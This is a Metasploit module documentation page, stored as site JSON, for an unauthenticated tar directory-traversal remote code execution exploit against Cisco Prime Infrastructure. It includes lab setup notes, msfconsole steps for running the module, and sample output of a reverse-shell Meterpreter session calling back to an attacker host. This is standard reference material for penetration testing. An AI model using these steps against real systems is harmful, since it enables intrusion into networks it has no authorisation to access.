{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/cpi_tararchive_upload","result":{"data":{"moduleMetadataJson":{"id":"bfd34c66-bdc3-5837-a9da-5d70f0e76277","name":"Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability","fullname":"exploit/linux/http/cpi_tararchive_upload","description":"This module exploits a vulnerability found in Cisco Prime Infrastructure. The issue is that\n        the TarArchive Java class the HA Health Monitor component uses does not check for any\n        directory traversals while unpacking a Tar file, which can be abused by a remote user to\n        leverage the UploadServlet class to upload a JSP payload to the Apache Tomcat's web apps\n        directory, and gain arbitrary remote code execution. Note that authentication is not\n        required to exploit this vulnerability.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/cpi_tararchive_upload","documentationSlug":"/modules/documentation/exploit/linux/http/cpi_tararchive_upload","referencesSlug":"/modules/references/exploit/linux/http/cpi_tararchive_upload"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a vulnerability found in Cisco Prime Infrastructure. The issue is that the TarArchive Java class the HA Health Monitor component uses does not check for any directory traversals while unpacking a Tar file, which can be abused by a remote user to leverage the UploadServlet class to upload a JSP payload to the Apache Tomcat's web apps directory, and gain arbitrary remote code execution. Note that authentication is not required to exploit this vulnerability.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Cisco Prime Infrastructure releases prior to 3.4.1, 3.5, and 3.6, also EPN Manager releases prior to 3.0.1. The Metasploit module is specifically designed to target CPI 3.4.0.</p>\n<h2 id=\"notes-on-setup\" style=\"position:relative;\"><a href=\"#notes-on-setup\" aria-label=\"notes on setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Notes on Setup</h2>\n<p>While developing the exploit, I happended to run into several issues that made the process more difficut. It was really because I didn't have the best hardware to work with, but in case you are trying to set up Cisco Prime Infrastructure as VMs like me, you may want to read this first.</p>\n<p>Special thanks to Steven Seeley (mr_me) for providing some of the most important setup notes himself.</p>\n<p><strong>Hardware Requirements</strong></p>\n<p>There are two machines you want to set up using the same ISO, the first is called the \"primary\" server, and the other is \"secondary\" (High Availability) server. They both require the same hardware:</p>\n<ul>\n<li>4 CPU Cores.</li>\n<li>12288 MB of RAM (12GB).</li>\n<li>350GB of hard drive space, but you may still run out of it in days.</li>\n<li>Both VMs should be on the same network.</li>\n</ul>\n<p><strong>SCP</strong></p>\n<p>In case you want to transfer files, you will probably use scp. Before you do that, run the following script as admin on CPI. It will generate the credentials you need to scp files:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">/opt/CSCOlumos/bin/getSCPcredentials.sh</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>By default, the CPI's SSH server's authentication method is password, you may end up running scp like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">scp -r -o PreferredAuthentications=password admin@ip:/tmp/something.zip .</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>Out of Space Issues</strong></p>\n<p>Cisco Prime Infrastructure requires a lot of space on the primary server. If it ever reaches to a point where it shuts down unexpectedly, you may not be able to bring the NCS services back again (such as port 80, 443, or 8082). At least for me, I couldn't figure out. If that's the case, you may need to reinstall the VM.</p>\n<p><strong>Unstable HA Connection</strong></p>\n<p>Sometimes the primary and secondary may experience some difficulty staying connected. If this happens, try to do the following on both machines:</p>\n<ol>\n<li>Run <code class=\"language-text\">ncs stop</code> to stop the services</li>\n<li>Run <code class=\"language-text\">ncs cleanup</code></li>\n<li>Run <code class=\"language-text\">ncs start</code>, this may take 10 to 30 minutes to finish.</li>\n<li>Finally, run <code class=\"language-text\">ncs status</code> to make sure they are talking.</li>\n</ol>\n<p>If the secondary server isn't working with the primary, then the HealthMonitor service may not be in the exploitable condition.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do <code class=\"language-text\">use exploit/linux/http/cpi_tararchive_upload</code></li>\n<li>Do <code class=\"language-text\">set payload</code> to select the preferred payload</li>\n<li><code class=\"language-text\">set rhosts [ip]</code></li>\n<li><code class=\"language-text\">run</code>, this should give you a shell</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><strong>Running the check</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/cpi_tararchive_upload) &gt; check\n[*] 192.168.0.23:8082 - The target service is running, but could not be validated.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p><strong>Exploiting the service</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(linux/http/cpi_tararchive_upload) &gt; run\n\n[*] Started reverse TCP handler on 192.168.0.21:4444 \n[*] Uploading tar file (3072 bytes)\n[*] Executing JSP stager...\n[*] Sending stage (985320 bytes) to 192.168.0.23\n[*] Meterpreter session 3 opened (192.168.0.21:4444 -&gt; 192.168.0.23:57127) at 2019-06-07 02:50:13 -0500\n[!] This exploit may require manual cleanup of &#39;/tmp/UdqUlWsFjp.bin&#39; on the target\n[!] This exploit may require manual cleanup of &#39;apache-tomcat-8.5.16/webapps/ROOT/kmeEmkzdep.jsp&#39; on the target\n\nmeterpreter &gt; \n[+] Deleted /tmp/UdqUlWsFjp.bin\n[+] Deleted apache-tomcat-8.5.16/webapps/ROOT/kmeEmkzdep.jsp</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"bfd34c66-bdc3-5837-a9da-5d70f0e76277"}}}